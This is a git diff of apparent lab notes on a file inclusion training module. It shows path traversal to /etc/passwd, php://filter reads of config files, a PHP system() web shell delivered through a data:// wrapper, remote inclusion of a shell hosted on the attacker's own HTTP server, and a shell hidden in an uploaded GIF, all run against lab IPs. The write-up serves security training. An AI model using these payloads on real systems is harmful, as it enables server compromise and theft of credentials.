@@ -8,21 +8,21 @@ Many modern back-end languages, such as PHP, Javascript, or Java, use HTTP param
 
 **Using the file inclusion find the name of a user on the system that starts with "b".**
 
-<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
 change the lang parameter:
 
 * [http://94.237.56.188:45743/index.php?language=/../../../../etc/passwd](http://94.237.56.188:45743/index.php?language=/../../../../etc/passwd)
 
-<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 **Submit the contents of the flag.txt file located in the /usr/share/flags directory.**
 
 {% embed url="http://94.237.56.188:45743/index.php?language=/../../../../usr/share/flags/flag.txt" %}
 
-<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Basic Bypasses
 
@@ -30,7 +30,7 @@ change the lang parameter:
 
 {% embed url="http://83.136.253.251:33813/index.php?language=languages/..././..././..././..././flag.txt" %}
 
-<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### PHP Filters
 
@@ -38,17 +38,17 @@ change the lang parameter:
 
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://83.136.253.251:31143/FUZZ.php
 
-<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
 
 index.php?language=**php://filter/read=convert.base64-encode/resource=configure**
 
 {% embed url="http://83.136.253.251:31143/index.php?language=php://filter/read=convert.base64-encode/resource=configure" %}
 
-<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
 
 `echo "PD9waHAKCmlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PSAnR0VUJyAmJiByZWFscGF0aChfX0ZJTEVfXykgPT0gcmVhbHBhdGgoJF9TRVJWRVJbJ1NDUklQVF9GSUxFTkFNRSddKSkgewogIGhlYWRlcignSFRUUC8xLjAgNDAzIEZvcmJpZGRlbicsIFRSVUUsIDQwMyk7CiAgZGllKGhlYWRlcignbG9jYXRpb246IC9pbmRleC5waHAnKSk7Cn0KCiRjb25maWcgPSBhcnJheSgKICAnREJfSE9TVCcgPT4gJ2RiLmlubGFuZWZyZWlnaHQubG9jYWwnLAogICdEQl9VU0VSTkFNRScgPT4gJ3Jvb3QnLAogICdEQl9QQVNTV09SRCcgPT4gJ0hUQntuM3Yzcl8kdDByM19wbDQhbnQzeHRfY3IzZCR9JywKICAnREJfREFUQUJBU0UnID0" | base64 -d`
 
-<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Remote Code Execution (RCE)
 
@@ -58,7 +58,7 @@ index.php?language=**php://filter/read=convert.base64-encode/resource=configure*
 
 `curl "http://94.237.55.163:41581/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"`
 
-<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -68,11 +68,84 @@ W1BIUF0KCjs7Ozs7Ozs7Ozs7Ozs7Ozs7OzsKOyBBYm91dCBwaHAuaW5pICAgOwo7Ozs7Ozs7Ozs7Ozs7
 
 echo "code above" | base64 -d
 
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
+nothing much usefull..
+
+echo "\<?php system($\_GET\["cmd"]); ?>" | base64
+
+* PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+
+Craft payload for URL
+
+* [`http://94.237.55.163:53636/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id%20|%20grep%20uid`](http://94.237.55.163:53636/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D\&cmd=id%20|%20grep%20uid)
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+* `http://94.237.55.163:53636/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id | ls`
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+* `http://94.237.55.163:53636/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id | ls+/`
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+* **`http://94.237.55.163:53636/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id | cat /37809e2f8952f06139011994726d9ef1.txt`**
+
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
 
 ### Remote File Inclusion (RFI)
 
+So far in this module, we have been mainly focusing on Local File Inclusion (LFI). However, in some cases, we may also be able to include remote files "Remote File Inclusion (RFI)", if the vulnerable function allows the inclusion of remote URLs. This allows two main benefits:
+
+```
+Enumerating local-only ports and web applications (i.e. SSRF)
+Gaining remote code execution by including a malicious script that we host
+```
+
+In this section, we will cover how to gain remote code execution through RFI vulnerabilities. The Server-side Attacks module covers various SSRF techniques, which may also be used with RFI vulnerabilities.
+
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+**Attack the target, gain command execution by exploiting the RFI vulnerability, and then look for the flag under one of the directories in /**
+
+echo '\<?php system($\_GET\["cmd"]); ?>' > shell.php
+
+sudo python3 -m http.server 8080
+
+http://\<SERVER\_IP>:/index.php?language=http://\<OUR\_IP>:\<LISTENING\_PORT>/shell.php\&cmd=id
+
+* http://10.129.29.114/index.php?language=http://10.10.15.124:8080/shell.php\&cmd=id
+
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+* [http://10.129.29.114/index.php?language=http://10.10.15.124:8080/shell.php\&cmd=ls+/exercise](http://10.129.29.114/index.php?language=http://10.10.15.124:8080/shell.php\&cmd=ls+/exercise)
+
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+* [http://10.129.29.114/index.php?language=http://10.10.15.124:8080/shell.php\&cmd=cat+/exercise/flag.txt](http://10.129.29.114/index.php?language=http://10.10.15.124:8080/shell.php\&cmd=cat+/exercise/flag.txt)
+
+<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
 ### LFI and File Uploads
+
+File upload functionalities are ubiquitous in most modern web applications, as users usually need to configure their profile and usage of the web application by uploading their data. For attackers, the ability to store files on the back-end server may extend the exploitation of many vulnerabilities, like a file inclusion vulnerability.
+
+The File Upload Attacks module covers different techniques on how to exploit file upload forms and functionalities. However, for the attack we are going to discuss in this section, we do not require the file upload form to be vulnerable, but merely allow us to upload files. If the vulnerable function has code Execute capabilities, then the code within the file we upload will get executed if we include it, regardless of the file extension or file type. For example, we can upload an image file (e.g. image.jpg), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.
+
+**Use any of the techniques covered in this section to gain RCE and read the flag at /**
+
+`echo '<?php system($_GET["cmd"]); ?>' > shell.gif`
+
+{% embed url="http://94.237.63.93:33236/settings.php" %}
+
+Upload crafted shell.gif
+
+<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+Path to our uploaded shell.gif:
+
+* \<img src="/profile\_images/shell.gif" class="profile-image" id
 
 ### Log poisoining
 
